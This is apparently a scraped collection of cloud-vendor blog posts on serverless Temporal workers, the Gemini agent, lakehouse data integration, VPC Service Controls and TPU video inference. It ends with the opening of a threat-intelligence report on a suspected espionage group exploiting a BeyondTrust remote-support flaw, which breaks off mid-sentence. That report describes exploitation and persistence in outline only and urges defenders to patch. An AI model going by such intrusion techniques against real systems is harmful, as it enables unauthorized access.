title: Temporal Serverless Workers on Cloud Run: Scale workers ahead of demand
raw_text: The open-source Temporal execution platform is rapidly becoming a foundational layer of modern software infrastructure — especially for orchestration in distributed systems and AI agent workloads. However, deploying and scaling workers in Temporal comes with unique challenges. Workers poll for tasks instead of serving requests, so request-driven serverless platforms can be an awkward fit. This often results in running worker fleets on Kubernetes or VMs, which you have to manage and pay for continuously. You build a metrics pipeline and tune autoscaling triggers, and scaling still trails bursts because of metrics lag. Every deployment means juggling upgrades and versions, and you pay for that compute whether or not there's work in the queue. We built Cloud Run worker pools for exactly this kind of pull-based work: Your instances connect to a queue or stream, take the next item, and process it. Starting today, Temporal Cloud , which is the fully managed version of Temporal’s open-source platform, can scale them for you. Currently in preview, Temporal Serverless Workers on Cloud Run let you deploy your workers as a worker pool, and Temporal sizes the pool to match the work on your task queues. When there's no work, it can scale the pool to zero. There's no cluster or autoscaler to run, and your worker code stays the same. How Cloud Run worker pools fit with Temporal A worker pool is Cloud Run's resource for continuous background work. It has no public endpoint, and each instance is allocated CPU for its whole lifetime, which matches how a Temporal worker runs. Temporal manages your Cloud Run worker pools as follows: Your Temporal workers run as Cloud Run worker pool instances in your project and poll Temporal Cloud for tasks. Temporal Cloud tracks your task queues and sets the worker pool's instance count through the Cloud Run Admin API, using the IAM permissions you grant. Temporal never opens a connection to your instances, so you don't need to open ports or add firewall rules for it. You run each build version as its own Cloud Run worker pool. An older build's worker pool can sit at zero instances until a workflow that started on it needs it again. Your Temporal workers run in your project, under your service account, and on your network. Temporal decides how many of them run. What you can build with Temporal Serverless Workers The combination of Cloud Run worker pools with Temporal Serverless Workers opens up a variety of interesting use cases: Autoscaled agentic workers: AI agents run multi-step chains of LLM reasoning and tool calls. Temporal's durable execution and Cloud Run worker pools work together here. Temporal workers spin up instantly to handle bursts of LLM steps, embeddings or API calls, then scale to zero when the queue empties. Workers get keyless access to Google Cloud AI APIs. You can also attach a GPU for inference, and the workers attached to the GPUs will still scale to zero. Temporal runs each model and tool call as a durable activity; if a worker disappears mid-step, the activity retries on another worker and the workflow continues. Long-running Workflows : Temporal Workflows can run indefinitely, allowing for building applications that track the state of real-world resources over long periods of time. This pattern is typically known as the “ Entity Pattern ,” because the Workflow represents the state of some entity. However, these long-running Workflows don’t usually have consistent compute requirements: Some individual steps are short, some are long, and other times, the Workflow is sleeping, waiting for external input, such as from a human or another system. Cloud Run worker pools provide flexible compute to support this pattern: Individual steps can run for as long as is required, and Temporal will automatically scale down the worker pool when there is no work to be done. Bursty batch work: Worker pools bill only while instances run, so a worker pool that sits idle between batch runs costs nothing while it's at zero instances. For jobs like billing runs or media transcoding, Temporal scales the pool out as batches arrive and back in once the queue drains. Your maximum instance count caps how many instances you pay for. Tasks beyond that capacity wait in the queue rather than being dropped. Why Cloud Run worker pools for Temporal workers Before, running Temporal workers on Cloud Run services took some workarounds: an HTTP listener, because services expect containers to listen on a port instance-based billing, so workers kept their CPU between requests minimum instances, so the service didn't scale to zero By running Temporal workers on Cloud Run worker pools, you don’t need those workarounds anymore, and you have: No endpoint to manage. There's no public URL or load balancer to lock down, and no health-check port to implement. Steady CPU at a lower price. Instances don't idle or throttle. Cloud Run doesn't remove instances because they look idle, so Temporal alone decides when the pool shrinks. Worker pools list at almost 40% less per vCPU-hour and GB-hour than instance-billed Cloud Run services. Scaling without revision churn. Changing the instance count doesn't create a new revision, so Temporal can resize the pool as often as the load changes. How Temporal manages scaling and versioning of worker pools Temporal decides when to add capacity using one main signal: the delay between a task landing in the task queue backlog and a worker picking it up. If that delay grows, the available workers are saturated. Scaling occurs as follows: Server-side detection: The Temporal server tracks this backlog-to-worker latency for each task queue. Push notification: When the latency crosses its trigger conditions, the server sends a push notification to the worker controller instance. Provisioning: The worker controller then adds capacity to the worker pool. New instances take time to start and connect before they can poll for tasks, so capacity lags behind the signal. Because Temporal keeps spare capacity, the pool grows ahead of demand instead of after tasks pile up. Scale-in is more conservative. Temporal waits for a stabilization period after the last time a task found no available worker (90 seconds by default), and it pauses between successive reductions. Cloud Run’s configurable graceful shutdown extends shutdown from 10 seconds to 10 minutes. That gives SIGTERM-aware workers time to finish or checkpoint. The instance count stays between a minimum and a maximum that you set. If the first task after an idle period can't wait for an instance to start, set the minimum above zero. Deploying new workflow code without breaking running executions is hard. Temporal workflows are stateful and deterministic, so if you swap their code mid-run, you get non-determinism errors. Serverless Workers on Cloud Run solve this by requiring Temporal Worker Versioning. You don't patch code with conditional branches. Instead, you deploy each Worker Deployment Version as its own worker pool deployment, identified by a deploymentName and a buildId . Using distinct worker pools solves two problems: Workflows that started on a particular Worker Deployment Version continue to run and complete on that version. Each Worker Deployment Version is scaled and drained individually, matching compute spend and utilization to the requirements of your application. As existing workflows complete and drain on a previous Worker Deployment Version, the underlying Worker Pool is eventually scaled down to zero automatically. You set a versioning behavior for each Workflow type, or set a Worker-level default: PINNED: A workflow stays on the Worker version (Build ID) it started on and finishes there. Best for short-running workflows, order processing and multi-step APIs. AUTO_UPGRADE: A workflow moves to the new "Current" or "Target" Worker Deployment Version as you roll it out. Best for long-running workflows, such as subscription billing or tasks that run for weeks. Learn more about configuring worker versioning here . Get started Setup takes three steps: Containerize your Temporal Worker and deploy the container as a Cloud Run worker pool, with the Build ID in the pool name. Keep credentials such as your Temporal API key in Secret Manager. Connect Temporal to your worker pool by granting Temporal Cloud permission to manage the worker pool so it can scale it. Create a Worker Deployment Version in Temporal that points at the pool's project, region, and name. Temporal Serverless Workers on Cloud Run is in preview, so APIs and configuration may change before the stable release. To get started, Learn how Serverless Workers on Cloud Run scale and handle versions. Deploy your first worker with the setup guide . See Cloud Run worker pools for CPU, memory, GPU and networking options. Sign up for the configurable graceful shutdown preview .

title: What the Gemini agent means for startups
raw_text: Small teams, short runway, and constant pressure to ship faster — it’s the reality we see every day among the founders we work with at Google for Startups. When you are building a company from the ground up, every hour spent on operational overhead or infrastructure plumbing is an hour taken away from your core product. Last week at Gemini at Work 2026, we introduced the Gemini agent : a single, universal agent designed to work both as your personal assistant and as a dedicated member of your team. And this week, we made our new frontier model, Gemini 4 Argon , widely available — trained to maintain context across long, multi-step tasks. Here is a look at how the Gemini agent works, five practical takeaways for founders, and how startups are already using it to punch above their weight. What is the Gemini agent? Instead of prompting separate chatbots for writing, coding, and data analysis, the Gemini agent is a single agent that takes high-level objectives and returns finished work. Three principles define it: Unified: A single agent can now handle knowledge work, data analysis, creative asset generation, and writing and running code. For complex jobs, it dynamically spins up temporary, job-specific sub-agents and coordinates their work in parallel or in sequence. Omnipresent access: It works across the surfaces you use every day — on the web, command line, desktop, and mobile, as well as natively inside Gmail, Docs, Sheets, Slides, Drive, Chat, and Calendar. Persistent: It runs in the cloud with continuous memory across four dimensions (session, semantic, procedural, and episodic). It onboards itself like a new hire — learning your team, tools, and business context so you don't have to re-explain your startup with every prompt, and keeping multi-day tasks moving even after you close your laptop. For founders wearing five hats at once, Gemini works like a digital chief of staff that's already briefed on your calendar, projects and documents. Ask it to research market trends, build a financial model in Sheets and turn both into a pitch deck, without repeating what the project or goals are at each step. It also works ahead of you. When an investor emails asking for your latest product update as a deck, Gemini spots the request and offers to handle it; one click and it comes back with completed work, ready for sharing or review. Five takeaways for startups 1. Coworker agents and skills help you scale your output Beyond personal assistance, you can create persistent coworker agents that work with your entire team. Each agent comes with its own Workspace account, email address, Drive storage, and directory presence. You can define a specific role — such as a launch coordinator, QA triager, or financial analyst — and your teammates can add agents to a Chat space or @mention it in a Google Doc comment to delegate work. You can also equip agents with reusable skills — or let Gemini write skills for itself as it learns your processes. For example, with operational reporting skills connected to BigQuery and the Knowledge Catalog, anyone on your team can ask a plain-language question to build and save a live report. Once saved, those reports run on demand without incurring additional token costs. Gemini also offers pre-built specializations, starting with legal and financial services. What it means for startups: Coworker agents can immediately increase the capacity of your teams, and skills can standardize repeatable processes like investor and operational reporting without burning tokens on every run. 2. Open and third-party model choice Gemini is the agent, and the model underneath is your choice. As startup architectures mature, sending every task to a single frontier model quickly eats into gross margins. With the Gemini agent, you can dynamically route workloads across Gemini models, third-party models like Anthropic’s Claude, and lightweight open models like Gemma . What it means for startups: You get flexibility without lock-in. You can optimize your cost per task — using compact models for high-volume, deterministic jobs and frontier models for complex reasoning — and swap models as your product evolves without rebuilding your workflows. 3. Connected to your services and tools An agent is only as useful as the systems it can reach. In addition to Google Workspace, the Gemini agent connects directly to your engineering, data, and business stack, including partner solutions: Development and collaboration: Git, Slack, Jira and more Data and local files: BigQuery, Postgres, Snowflake, Databricks, and more alongside files on your desktop Custom tools via MCP: Any Model Context Protocol (MCP) server inside or outside your network so your engineers can build and share internal tools. What it means for startups: Instead of spending engineering cycles maintaining custom connectors, your team can plug the agent straight into your existing codebase, databases, and MCP tools so it can act on live data wherever it lives. 4. Built-in security and governance For B2B startups, the enterprise security audit is often where deals stall. Under the hood, every agent is assigned a cryptographic Agent Identity for clear audit trails, runs inside an isolated sandbox, and protected with built-in prompt injection defenses. External traffic is routed through Agent Gateway , allowing you to enforce governance policies. And managing coworker agents is as straightforward as managing users today, since they all have a Workspace account. What it means for startups: When an enterprise buyer’s CISO asks how your AI workflows handle data privacy, prompt injection, and access control, you have an enterprise-grade architecture ready — helping you clear procurement hurdles. 5. Protect your runway with real-time cost controls Autonomous agents that run sub-agents for hours or days can quickly run up a bill if a loop goes unchecked. You can now set hard, real-time spend caps directly in the Cloud Billing Console; if a cap is reached, the project's agent automatically pauses so a bug never turns into a billing surprise. Underneath, Gemini runs on Google’s specialized AI infrastructure, including our inference-optimized TPU 8i, which delivers 80% better performance-per-dollar than the prior generation. What it means for startups: You and your developers can experiment with long-running, parallel agentic loops with a built-in financial safety net that protects your cash reserves and builds confidence with your backers. Founders already building Startups and AI-native innovators are already putting Gemini to work. Immersive storytelling platform Whenere used Dreamlands , an agentic 3D worldbuilding platform built on Gemini platform, to bring Pride and Prejudice to Fortnite — with Gemini generating textures for each new object in about 7 seconds for under 10 cents; one artist created nearly 250 custom assets in a single day and completed a historically accurate estate in under a week. They join application-building platform Lovable and fellow startups and innovators including OpenEvidence , Recursion , and Replit and more . Build with Google for Startups The agentic era gives lean teams the leverage to punch far above their weight — whether you’re deploying coworker agents to cover internal operations or building agentic workflows directly into your product. While these new Gemini agent capabilities are not publicly available yet, startups can contact our sales team to learn more and discuss how to get ready. In the meantime, you can explore the Google for Startups program to access credits, hands-on technical guidance, mentorship, global founder community programs and more.

title: Bringing the borderless Lakehouse into the agentic era with innovations for Gemini
raw_text: As enterprises shift their AI usage from experimental chatbots to autonomous agents, teams are hitting a critical bottleneck: accessing and reasoning over data scattered across multiple clouds, SaaS platforms, and on-premises systems. To turn AI agents into true systems of action, organizations need a foundation that can handle petabyte-scale reasoning without the security risks of data movement. Last week at our Gemini at Work event, we announced how Gemini can help you transform business workflows. To help power your agents with your enterprise data, we will dive deeper into the new Gemini integration with borderless Lakehouse to help you build, secure, and scale agents that work across your data estate. Access data that lives outside of Google Cloud through Gemini The ultimate value of the borderless Lakehouse is realized through the agents you build to transform your organization, with Gemini as the front door. With the new Gemini integration, data that’s either preconfigured or stored in your borderless Lakehouse is now directly integrated into Gemini. Currently in preview, this means you can set up access to new data sources, such as Databricks Unity Catalog or Snowflake Horizon, through Lakehouse catalog federation directly from Gemini. Now your business users can use natural language to query records that live across clouds while your AI agents can ground their reasoning and generate code from the same data — all without moving it. By directly contextualizing AI agents across your borderless Lakehouse, you can help accelerate your organization’s AI adoption while simplifying access to critical information. Gemini agents invoked by business users can access data that lives in BigQuery and Databricks Unity Catalog to provide comprehensive reporting and get insights using natural language. Borderless Lakehouse advancements In addition to this new, native integration with Gemini, we’re sharing that several features we introduced earlier this year to power your data foundation with the borderless Lakehouse are now generally available, including: Support for Cross-Cloud Interconnect and cross-cloud caching for AWS and Azure BigQuery support for Apache Iceberg V3 specifications Read-write interoperability on Apache Iceberg tables for both BigQuery and Managed Service for Apache Spark Bi-directional caching with AWS Glue, Databricks Unity Catalog, and Snowflake Horizon Catalog using Lakehouse runtime federation Integration with Knowledge Catalog Zero-copy data integration with Salesforce, SAP and Workday, and now, Confluent Tableflow Synchronization of Databricks Delta Lake assets through the Lakehouse console using Dataflow Let’s explore. Performance and reasoning at petabyte scale While agent context windows are typically limited to ingesting hundreds of kilobytes at a time, enterprise workflows sometimes join petabytes of data across clouds. An agent-native data platform that needs to combine data across sources, like product and customer data, to your CRM cloud and warehouse telemetry needs to be able to process data at scale. When you do this over MCP, you are limited to megabyte scale because of context windows and payload size. By integrating at every layer of the data and AI stack, the borderless Lakehouse provides enterprise-grade scalability, enabling agents to reason over petabytes of data with similar performance to it being stored locally. At the networking layer, Cross-Cloud Interconnect and cross-cloud caching provide high-throughput, low-latency paths to AWS and Azure, eliminating variable egress fees. When an agent joins Iceberg tables in Amazon Azure Data Lake Storage with data in BigQuery, every uncached byte it scans crosses a cloud boundary, so the network sets the pace. Cross-Cloud Interconnect gives the Lakehouse a dedicated, private connection between Google Cloud and AWS or Azure, at 10 Gbps or 100 Gbps per connection. Lakehouse queries travel over that connection rather than the public internet, so latency stays low and predictable. Cross-cloud caching serves repeat reads from inside Google Cloud, so agents can query data in other clouds without migrating it. The borderless Lakehouse includes several key optimizations to integrate Iceberg metadata within the query engine. BigQuery now supports Apache Iceberg V3 specifications, including binary deletion vectors and sort orders. These features allow the engine to handle row-level updates and deletes more efficiently by eliminating the need to rewrite entire data files. We also upgraded BigQuery’s execution engine with a new FlatBuffers-based Parquet reader and parallelized I/O to help reduce CPU overhead and serialization bottlenecks and narrow the performance gap between open formats and native storage. This builds upon recent performance innovations to the query engine designed to support agent workloads, which often come in herds and need to process small queries quickly and cost effectively. With BigQuery fluid scaling and history based optimizations , you can run scalable and efficient agent workloads while maintaining openness with Apache Iceberg. Meanwhile, read-write interoperability on Apache Iceberg tables for both BigQuery and Managed Service for Apache Spark makes it easy for all of your data teams to work off the same Iceberg tables in Google Cloud Storage. This vertically optimized stack helps make your agents faster and more cost-effective, leveraging the power of BigQuery and Lightning Engine to activate data without moving it. To expand the analytical depth of the lakehouse, graph support for Iceberg in BigQuery lets you analyze relationship networks, such as supply chains, directly on open table datasets. Comprehensive context and data access for your agents An AI agent is only as smart as the context it can access. To help prevent hallucinations and improve accuracy at the metadata layer, the borderless Lakehouse unifies your enterprise data using the Lakehouse runtime catalog . Based on the Apache Iceberg REST Catalog, it provides bi-directional catalog federation with AWS Glue, Databricks Unity Catalog, and Snowflake Horizon Catalog. The Lakehouse runtime catalog also includes a new standard Hive Metastore-compatible endpoint, allowing engines like Apache Spark, Trino, and Presto to discover metadata without architectural changes. The borderless Lakehouse also integrates directly with Knowledge Catalog , which automatically indexes your distributed data assets, to provide the precise business metadata and semantic definitions agents need to reason over your entire enterprise corpus — including unstructured data in Cloud Storage. This gives agents just enough context to be accurate while controlling token costs, helping you develop an intelligent and sustainable agentic strategy. The borderless Lakehouse provides zero-copy data integration with your SaaS applications like Salesforce, SAP and Workday and integrates with a larger partner ecosystem, capturing enterprise data in Knowledge Catalog and acting as a single context engine for your agents. Today, we’re expanding the partner ecosystem with new integrations for Confluent Tableflow, now generally available, which syncs to Lakehouse runtime catalog so the Iceberg tables it produces show up directly in BigQuery, with no copying and no extra ETL. Finally, organizations with Databricks-centric repositories can now easily import, transform and synchronize their Delta Lake assets into Lakehouse through the Lakehouse console using Dataflow. Modernize with ease Customer use of Apache Iceberg has more than tripled since the beginning of 2025, and enterprises building with Google Cloud’s borderless Lakehouse are seeing significant impact from it: Etsy unified three petabytes with borderless Lakehouse, joining data in place to accelerate pipeline queries by 60%. Commerzbank transforms raw distributed data into governed, agent-ready access. Hightouch integrates directly with borderless Lakehouse so teams can power their marketing directly on an open Iceberg lakehouse and activate that data across the Google Cloud ecosystem. Roundel modernized its Target Product Ads technology stack from the ground up with borderless Lakehouse, completely rebuilding its data ingestion, processing, and measurement pipelines. If you are ready to get started with the transition to borderless Lakehouse for your organization, it doesn’t need to be difficult. For organizations currently using legacy Dataproc Metastore, we now offer an automated, zero-downtime migration path to the serverless Lakehouse runtime catalog. This preserves your existing schemas and lineage while unlocking the AI-ready features of the borderless Lakehouse, so you can stop managing infrastructure and start activating agents. Get started today with the Build a borderless Lakehouse codelab or visit our website to learn more.

title: Modernizing perimeter security: Scalable perimeters with VPC Service Controls
raw_text: Agents represent a fundamental shift in cloud operations. They can act on behalf of users or autonomously, make non-deterministic decisions, and request data across projects at unprecedented speed and scale. Because agents are a distinct category of non-human identity (NHI), they require unique secure-by-default guardrails. Traditional, manually-operated network perimeters are vulnerable to today’s machine-speed attacks. Overly permissive perimeters, built to avoid blocked connections, increase the risk of unauthorized data theft, but overly strict perimeters stall development under a flood of access denials. Today, we're excited to announce key enhancements to VPC Service Controls (VPC-SC) that make perimeters easier to create, maintain, and scale. You can now add folders to perimeter membership, so that projects contained in them inherit policy. You can also manage granular exceptions and resolve denials with guided, scoped remediation. The result is data protected by default, so you can scale autonomous agents across your enterprise without letting data leave your perimeter. This update is generally available, and at no additional cost. Perimeters aligned to your architecture VPC-SC provides a context-aware network security perimeter around your Google Cloud deployment, designed to secure your organization against data theft, even in the event of compromised credentials, identity and access management (IAM) misconfigurations, and insider threats. By extending network-layer protection across service-to-service interactions in Google Cloud's infrastructure, VPC-SC goes beyond traditional firewalls and creates an additional layer of defense that prevents access outside your corporate network — and is now easier for your organization to manage. Cloud administrators configuring VPC-SC can now include folders in perimeter membership , automatically extending the folder’s access policy to every project and nested subfolder it contains. New workloads can inherit protection by default, with no further modification. Figure 1: Simplified perimeter authoring in VPC-SC. Perimeter membership updates when a project is moved, simplifying lifecycle maintenance. Security coverage follows the resource hierarchy that your organization already governs, and compliance verification requires only confirming that the resource is located in the correct part of the hierarchy. Dry-run mode also supports folder membership, helping administrators evaluate the effect of a hierarchy-wide perimeter against live traffic before enforcement. Folder and organization support in ingress and egress rules Well-defined ingress and egress rules establish granular, context-aware perimeters without sacrificing operational flexibility across complex multi-project environments. Security administrators can now specify Google Cloud folders and organizations directly within those rules. A single hierarchy reference stands in for the set of projects beneath it, which keeps rules concise, keeps attribute counts well within quota limits, and extends access automatically to projects created later in the hierarchy. Figure 2 : Simplified authoring of ingress/egress rules. Using Private Service Connect endpoints in ingress and egress rules Enterprises increasingly use private paths to reach desired endpoints in their deployment instead of exposing the traffic to the internet. Private Service Connect endpoints for Google APIs are now supported as an attribute in ingress and egress rules. Administrators can author a rule that authorizes access specifically over a designated private endpoint, producing a policy that corresponds directly to the connectivity architecture it is intended to govern. Figure 3: Supporting Private Service Connect endpoints with ingress and egress rules. For organizations that have standardized on Private Service Connect, including endpoints propagated across the estate through Network Connectivity Center , this provides both a more precise and a more concise means of expressing source for the request. Service patterns in VPC accessible services Service patterns in VPC accessible services provide granular control over Google APIs accessed with private Virtual IP addresses (VIP), permitting interoperability beyond just VPC-SC integrated services. If the workload requires controlled access to validated API endpoints over a private path, administrators can now allow only the specific API URL patterns required. Additionally, the capability supports appending org-restriction-headers with egress requests to facilitate access to only authorized domains and resources. Because you don’t need to manage egress-proxy, you can accommodate legitimate operational requirements while maintaining a tightly-bounded private path, instead of choosing between a broad allowance and no access at all. Figure 4: Granular control over Google APIs with service patterns in VPC accessible services. Guided violation remediation VPC-SC perimeter policies evolve continuously alongside the workloads they protect, and administrators periodically need to authorize a legitimate access request not yet covered. New Guided Violation Remediation in VPC-SC Violation Analyzer cuts resolution time for blocked requests from days to minutes by generating a policy fix with remediation recommendations, which you can validate in Dry-Run mode first. Rather than just diagnosing why the violation occurred for a given denial, Violation Analyzer evaluates the blocked request against the applicable perimeter configuration, and proposes a specific configuration change, narrowly scoped by least-privilege design principles, to authorize the traffic: an ingress rule, an egress rule, an access level, or an update to VPC accessible services. This relieves pressure on administrators to broadly open up a perimeter just to resolve a violation and get an application working quickly. Read more about how BlackLine uses Violation Analyzer to streamline investigations . Figure 5 : VPC-SC Violation Remediation for faster turn-around. Get started today VPC-SC makes it simple and automated to deploy and refine granular network perimeter protection, even for autonomous agents. To get started: Establish your folder baseline : Identify the folders in your resource hierarchy that correspond to the boundaries you intend to enforce, and define perimeters around them so that new workloads inherit policy on creation. Run risk-free in Dry-Run mode : Observe production traffic safely without blocking active developers. Unblock traffic with Violation Analyzer and Violation Dashboard : Use automated least-privilege remediation recommendations to resolve any denials that surface. Enforce with confidence : Secure your full data estate by transitioning to enforcement once your dry-run logs show your intended access with clean, authorized traffic. To learn more about how VPC-SC can help simplify your data security posture and confidently secure your autonomous agent fleets, check out the VPC-SC documentation .

title: How Visko streams real-time world models on Google Cloud TPUs
raw_text: Editor's note: Generative AI startups are moving rapidly beyond static clip generation to build interactive, real-time worlds. In this technical deep dive, we explore how AI startup Visko collaborated with Google Cloud TPU engineers to deploy Orbis — its continuously streaming Live World Model—on Cloud TPUs, going from initial kickoff to production handover in just 30 days. What makes a live video world model so challenging to serve in production? The bottleneck isn't average throughput — it's beating a relentless real-time clock. Unlike offline video generators where a user submits a prompt and waits in a queue, a live world model streams continuously. Every new chunk of video and synchronized audio must finish rendering before the viewer finishes watching the previous one, or the world freezes. Today, we're excited to share how Visko , an AI startup pioneering interactive world models, teamed up with Google Cloud to solve this exact challenge. Working side by side, Visko and Google Cloud engineers deployed Visko's end-to-end live inference pipeline — combining video generation, super-resolution upscaling, and synchronized audio—onto a single Cloud TPU slice . Together, the teams brought end-to-end generation down, rendering at 1.07x playback speed. Here is an inside look at how we engineered the pipeline to hit that milestone in a single month, the architectural optimizations that moved the needle, and practical lessons for other startups building ultra-low-latency generative AI on Google Cloud. Redefining interactive media with Live World Models While most generative video platforms focus on rendering fixed, pre-baked clips, Visko is building what it calls Live Models : video world models that generate continuously and respond on the fly. Visko's flagship model, Orbis , streams live video starting from a single text or image prompt. As the stream plays, viewers can enter new steering prompts in real time, dynamically evolving the scene without restarting or breaking continuity. For instance, in one test session, the livestream opens on a cat napping beside a crackling fireplace; when the viewer steers the scene to introduce a bowl of food, the bowl materializes seamlessly, and the cat stretches, stands up, and meows. Since launching its public demo on September 1, 2026, Orbis has unlocked new possibilities across interactive entertainment, live commerce, AI companions, immersive education, and robotics simulation. To scale these interactive sessions reliably, Visko partnered with Google Cloud TPU engineers in August 2026 to port the Orbis live pipeline to Google's Tensor Processing Unit (TPU). Within 30 days, the full multimodal pipeline was running in real time on TPUs. Visko’s ambition is to power a new generation of interactive worlds that people can step into and shape in real time. Streaming continuous video and audio under a strict clock is a fundamentally different system challenge than offline clip generation. Working side by side with Google Cloud's TPU engineers, we brought the full Orbis pipeline to TPUs in just 30 days — giving us the low-latency compute and memory bandwidth required to bring Live Models to creators and developers at scale. "Visko is bringing an exciting new class of real-time, steerable workloads to the Cloud TPU ecosystem. By co-engineering their live multimodal pipeline on a singleTPU slice using JAX, torchax, and custom Pallas kernels, we proved how quickly a lean startup team can go from PyTorch prototype to render at 1.07x playback speed on Google Cloud's AI Hypercomputer." – Dave Elliott, Head of Developer Advocacy for AI, Google Cloud Live video is a hard-deadline problem When you serve an offline clip generator, latency is forgiving — the user waits once while the backend processes frames. A live world model has no waiting room. Every single chunk must be denoised, decoded from latents, upscaled to 1664x936 (at 18 fps), and paired with generated audio faster than realtime playback speed, for as long as the session runs. Two structural constraints make live world models far more demanding than standard batch inference: Batch size of one: Each live stream represents an individual viewer's interactive session. You cannot mask latency by grouping dozens of concurrent requests into a massive batch — the standard playbook for keeping AI accelerators saturated. Strict sequential dependency: Every chunk depends directly on the one before it. Because the video model maintains a rolling memory of recent video latents so that chunk N+1 smoothly continues the action from chunk N, you cannot pre-render chunks out of order or parallelize across future timestamps. For startup infrastructure engineers coming from LLM serving, it helps to think of live world modeling not as a tokens-per-second throughput benchmark, but as an unforgiving per-step latency SLO . Architecting the multimodal pipeline on a single TPU slice To keep infrastructure lean and cost-effective as Visko scales, the team designed the live pipeline to chain three distinct generative models on a single Cloud TPU slice running in BF16 precision. When a viewer submits an initial prompt or a live steering update, all three generative models — the core video diffusion model, the super-resolution upscaler, and the audio generator — share the same chips, taking turns on the hardware for each chunk. Figure 1: Visko's end-to-end Orbis live pipeline chains video diffusion, latent decoding, super-resolution upscaling, and pure-JAX audio generation sequentially on a single Cloud TPU slice, completing each chunk faster than the playback speed. To combine rapid startup iteration with bare-metal accelerator speed, the software stack is built on three open-source pillars: JAX : Google's high-performance Python array library for accelerators, compiled into optimized machine code by the XLA compiler. torchax : An interoperability layer that runs PyTorch models directly on Cloud TPUs via JAX, enabling startup teams to bring existing PyTorch components over without an upfront, ground-up rewrite. Pallas : The custom kernel programming language for TPUs in JAX. Real-time performance breakdown: Hitting the clock By profiling and optimizing each stage on a single slice in BF16, the engineering team achieved a total per-chunk latency of under the target while — maintaining roughly 7% headroom to absorb variance during live streaming: Figure 2: Chart of per-chunk latency budget on one TPU slice. Because video denoising accounts for nearly two-thirds of the total compute budget, that stage became the primary focus of our kernel and parallelism optimizations. Inside the stack: Three optimizations that unlocked real-time streaming 1. Ulysses context parallelism across all TPU chips A video chunk expands into a massive sequence of spatiotemporal tokens inside the video transformer. To distribute that workload across the TPU chips at batch size 1, the team implemented Ulysses context parallelism . Instead of splitting model weights, Ulysses splits the token sequence across chips. Immediately before the attention layer, a high-speed all-to-all interconnect exchange regroups the tensors so that each chip holds the entire video sequence, but only for one-quarter of the attention heads. After each chip computes attention over the full sequence for its assigned heads, a second all-to-all exchange restores the sequence-split layout for the feed-forward layers. Figure 3: Ulysses context parallelism across TPU chips at batch size 1. High-speed all-to-all Inter-Chip Interconnect (ICI) exchanges transition tensors between a sequence-split layout for feed-forward layers and a head-split layout for Pallas splash attention. 2. Custom Pallas splash attention from MaxDiffusion To accelerate the attention computation itself, the team integrated a custom Pallas splash attention kernel from MaxDiffusion , Google Cloud's open-source reference library for diffusion models on Cloud TPU. Splash attention brings FlashAttention-style tiling to TPU architecture: rather than materializing the full quadratic attention matrix in High Bandwidth Memory (HBM), it computes attention in compact tiles that remain inside ultra-fast on-chip VMEM. Startup teams can drop the exact kernel used in this port straight into their own pipelines via custom_splash_attention.py . 3. A 5.8x audio speedup by moving from torchax to pure JAX We first brought all three Orbis models onto Cloud TPU with torchax, which runs PyTorch code on TPU through JAX and XLA without a rewrite. For the video and upscaling models, torchax paired with Pallas attention kernels met our latency target directly, and both stay in torchax in the final pipeline. Only the audio model needed a rewrite. Moving the audio stage from torchax to native JAX made it 5.8x faster and brought the full pipeline under the playback deadline. Field notes for AI builders: Cloud TPU lessons Takeaways from tuning live multimodal inference on Cloud TPU: Ulysses context parallelism for single stream video : At batch size 1, splitting the token sequence across chips with all-to-all interconnect exchanges was faster than both tensor parallelism and ring attention. Native BF16 for continuous streams : FP8 quantization cuts memory bandwidth pressure, but small quantization errors build up across chunks in a continuous stream. Native BF16 kept visual quality intact within the latency budget. Selective JAX ports : torchax kept the video and upscaling models in PyTorch, so the team only rewrote the audio bottleneck in native JAX. XLA compilation caching: The first boot spends a few minutes compiling XLA graphs. Caching compiled artifacts brings worker restarts under a minute. Building real-time generative models on Cloud TPU? Start here If your startup is pushing the boundaries of live video, world models, or ultra-low-latency multimodal inference, you can build with the same toolkit that powered Visko's port: Accelerate diffusion attention out of the box: Grab the open-source splash attention kernel used in this collaboration from MaxDiffusion , and explore the Pallas documentation to write custom TPU kernels. Migrate PyTorch fast, then optimize selectively: Bring your existing PyTorch models onto TPU quickly with torchax , pinpoint bottlenecks with the Cloud TPU Profiler , and port latency-critical stages to native JAX . Spin up TPUs on demand: Use TPU Flex-start VMs to provision TPU capacity for short development and benchmarking runs without a long-term reservation. Scale with Google for Startups: Early-stage AI startups looking for cloud credits, technical mentorship, and access to Google Cloud's AI Hypercomputer stack can apply to the Google for Startups Cloud Program . Special thanks to the Visko.ai team for the close technical partnership, and to the Google Cloud TPU engineers who lead the project including: Yixin Shi, James Huang, and Elisa Tsai.
summary: Editor's note: Generative AI startups are moving rapidly beyond static clip generation to build interactive, real-time worlds. In this technical deep dive, we explore how AI startup Visko collaborated with Google Cloud TPU engineers to deploy Orbis — its continuously streaming Live World Model—on Cloud TPUs, going from initial kickoff to production handover in just 30 days. What makes a live video world model so challenging to serve in production? The bottleneck isn't average throughput — it's beating a relentless real-time clock.

title: ARMORY CASTLE Exploits BeyondTrust
raw_text: Written by: Jayson Frost, Bryce Greathouse, Brian Meyer, John Palmisano, Rajesh Rajeshirke, Steve Rasch, John Wolfram Introduction On October 15, BeyondTrust disclosed a vulnerability, CVE-2026-102764, impacting BeyondTrust Remote Support (formerly Bomgar) appliances. BeyondTrust Remote Support is an enterprise secure remote access solution that enables IT teams to securely access and troubleshoot remote endpoints. The successful exploitation of this vulnerability results in the arbitrary upload of files. During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221 ), exploited this vulnerability as a zero-day, in late August 2026. This blog describes how ARMORY CASTLE escalated privileges and established persistent access to compromised BeyondTrust Remote Support appliances following exploitation of CVE-2026-102764, and provides actionable guidance for defenders. Organizations should prepare for potential widespread exploitation following this disclosure, as ARMORY CASTLE and other threat actors have historically conducted broad, opportunistic exploitation once the vulnerability becomes public. Exploitation Mandiant identified evidence of CVE-2026-102764 exploitation within the access, syslog, messages, thin-scc, brain and SSL log files, which are only accessible via an LUKS-encrypted partition which contains the /home directory. We strongly recommend that affected organizations immediately apply the security patches provided by BeyondTrust to remediate the vulnerability, and review additional guidance in their blog . Post-Exploitation Following the successful exploitation of CVE-2026-102764, Mandiant observed ARMORY CASTLE leverage multiple distinct TTPs to establish a foothold, escalate privileges, and enable lateral movement. Throughout the intrusion, ARMORY CASTLE leveraged a deep understanding of BeyondTrust appliance internals, as evidenced by their abuse of proprietary CLI utilities, startup configuration templates and local reverse-proxy routing. The threat actor used newly identified custom malware, the 